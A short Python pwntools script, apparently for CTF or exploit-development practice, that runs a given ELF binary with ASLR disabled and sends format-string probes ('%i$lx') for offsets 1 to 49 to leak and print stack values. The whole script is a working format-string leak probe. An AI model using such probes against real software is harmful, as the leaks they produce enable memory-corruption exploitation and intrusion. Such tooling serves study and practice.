import sys

import pwn


def main():
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} elf_path")
        sys.exit(1)
    elf_path = sys.argv[1]

    elf = pwn.context.binary = pwn.ELF(elf_path)
    pwn.context.aslr = False

    stack = []
    for i in range(1, 50):
        io = pwn.process(elf.path)
        io.sendline(f"AAAAAAAA:%{i}$lx:")
        io.recvuntil(":")
        stack.append((i, io.recvuntil(":")[:-1]))
        io.close()

    for i, value in stack:
        print(f"%{i}$lx -> {value}")


if __name__ == "__main__":
    main()
